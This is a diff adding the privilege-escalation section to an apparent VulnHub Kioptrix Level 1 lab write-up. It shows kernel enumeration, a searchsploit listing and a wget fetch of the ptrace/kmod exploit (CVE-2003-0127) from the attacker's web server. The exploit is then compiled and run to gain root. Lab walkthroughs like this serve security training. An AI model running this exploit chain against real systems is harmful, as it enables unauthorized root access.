@@ -355,12 +355,192 @@ Perfect! we got the server shell..
 
 ## Privilege Escalation
 
-... To be continued
+Checking the type of privelage we have
+
+```bash
+bash-2.05$ whoami
+whoami
+apache
+bash-2.05$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+```
+
+### Local Enumeration
+
+The most common vuln on these type of old machines are related to kernel, let's check the kernel version and check if there any matching exploits.
+
+```bash
+bash-2.05$ uname -a
+uname -a
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+bash-2.05$ cat /proc/version
+cat /proc/version
+Linux version 2.4.7-10 (bhcompile@stripples.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-98)) #1 Thu Sep 6 16:46:36 EDT 2001
+```
+
+**Findings:**
+
+Kernel Version: 2.4.7 (Red Hat Linux 7.1 2.96-98)
+
+Now searchsploit for any matching exploits
+
+```bash
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
+└─$ searchsploit linux kernel 2.4.x Escalation --exclude="/dos/"
+----------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                               |  Path
+----------------------------------------------------------------------------- ---------------------------------
+Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation    | solaris/local/15962.c
+Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation | linux/local/3.c
+Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation | linux/local/22362.c
+Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation | linux/local/22363.c
+Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / U | linux/local/9545.c
+Linux Kernel 2.4.x/2.6.x - 'Bluez' BlueTooth Signed Buffer Index Privilege E | linux/local/926.c
+Linux Kernel 2.4.x/2.6.x - 'uselib()' Local Privilege Escalation (3)         | linux/local/895.c
+Linux Kernel 2.4.x/2.6.x - BlueTooth Signed Buffer Index Privilege Escalatio | linux/local/25288.c
+Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Pr | linux_x86-64/local/33516.c
+Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                   | linux/local/41886.c
+Linux Kernel < 2.4.20 - Module Loader Privilege Escalation                   | linux/local/12.c
+Linux Kernel < 2.6.11.5 - BlueTooth Stack Privilege Escalation               | linux/local/4756.c
+Linux Kernel < 2.6.19 (Debian 4) - 'udp_sendmsg' Local Privilege Escalation  | linux/local/9575.c
+Linux Kernel < 2.6.19 (x86/x64) - 'udp_sendmsg' Local Privilege Escalation ( | linux/local/9574.txt
+Linux Kernel < 2.6.22 - 'ftruncate()'/'open()' Local Privilege Escalation    | linux/local/6851.c
+Linux Kernel < 2.6.28 - 'fasync_helper()' Local Privilege Escalation         | linux/local/33523.c
+Linux Kernel < 2.6.29 - 'exit_notify()' Local Privilege Escalation           | linux/local/8369.sh
+Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege E | linux_x86/local/15916.c
+Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privile | linux/local/15944.c
+Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privileg | linux/local/14814.c
+Linux Kernel < 2.6.36-rc4-git2 (x86-64) - 'ia32syscall' Emulation Privilege  | linux_x86-64/local/15023.c
+Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Es | linux/local/17787.c
+Linux Kernel < 2.6.37-rc2 - 'ACPI custom_method' Local Privilege Escalation  | linux/local/15774.c
+Linux Kernel < 2.6.7-rc3 (Slackware 9.1 / Debian 3.0) - 'sys_chown()' Group  | linux/local/718.c
+Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation            | linux/local/34923.c
+Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation | linux_x86-64/local/44302.c
+Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege | linux_x86-64/local/34134.c
+Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation    | arm/local/31574.c
+Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local | linux_x86-64/local/44299.c
+Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalati | linux_x86-64/local/26131.c
+Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privil | linux/local/25450.c
+Linux kernel < 4.10.15 - Race Condition Privilege Escalation                 | linux/local/43345.c
+Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escal | linux/local/45553.c
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalatio | linux/local/45010.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation       | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege  | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin | linux/local/47169.c
+----------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Many matched exploits found!, let's try the ptrace one.
+
+Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation | linux/local/3.c
+
+
+Check the exploit content then download it.
+
+```bash
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
+└─$ searchsploit -x linux/local/3.c
+/*
+ * Linux kernel ptrace/kmod local root exploit
+ *
+ * This code exploits a race condition in kernel/kmod.c, which creates
+ * kernel thread in insecure manner. This bug allows to ptrace cloned
+ * process, allowing to take control over privileged modprobe binary.
+ *
+ * Should work under all current 2.2.x and 2.4.x kernels.
+ *
+ * I discovered this stupid bug independently on January 25, 2003, that
+ * is (almost) two month before it was fixed and published by Red Hat
+ * and others.
+ *
+ * Wojciech Purczynski <cliph@isec.pl>
+ *
+ * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
+ * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
+ *
+ * (c) 2003 Copyright by iSEC Security Research
+ */
+
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
+└─$ searchsploit -m linux/local/3.c
+  Exploit: Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/3
+     Path: /usr/share/exploitdb/exploits/linux/local/3.c
+    Codes: OSVDB-4565, CVE-2003-0127
+ Verified: True
+File Type: C source, ASCII text
+Copied to: /home/kali/Desktop/Labs_Notes/VulnHub/Kioptrix_L1/3.c
+```
+
+Next step is to transfer the file into machine, there are multible way, i will go with wget the file from my own local web server.
+
+```bash
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
+└─$ sudo systemctl enable apache2.service
+Synchronizing state of apache2.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
+Executing: /usr/lib/systemd/systemd-sysv-install enable apache2
+
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
+└─$ sudo systemctl start apache2.service
+```
+
+Moving exploit file to /var/www/html/file/
+
+```bash
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
+└─$ sudo cp 3.c /var/www/html/file
+```
+
+Now download the file into machine.
+
+```bash
+bash-2.05$ cd /tmp
+cd /tmp
+bash-2.05$ wget http://192.168.11.100/file/3.c
+wget http://192.168.11.100/file/3.c
+--19:01:09--  http://192.168.11.100/file/3.c
+           => `3.c'
+Connecting to 192.168.11.100:80... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,754 [text/x-csrc]
+
+    0K ...                                                   100% @   3.58 MB/s
+
+19:01:09 (3.58 MB/s) - `3.c' saved [3754/3754]
+```
+
+Final step, compiling the file, then run it.
+```bash
+bash-2.05$ gcc -o priv_esc_01 3.c
+gcc -o priv_esc_01 3.c
+3.c:185:27: warning: no newline at end of file
+bash-2.05$
+bash-2.05$ 
+bash-2.05$ ./priv_esc_01
+./priv_esc_01
+[+] Attached to 2345
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+whoami
+root
+```
+
+We are **root**!
+
+<img width="1477" height="498" alt="image" src="https://github.com/user-attachments/assets/e36d540f-7be0-4e74-b365-41ce7b7d7079" />
 
 ---
 
 ## 🔗 References
 
-* 
+* [https://www.exploit-db.com/exploits/47080]
+* [https://www.exploit-db.com/exploits/3]
 
 ---
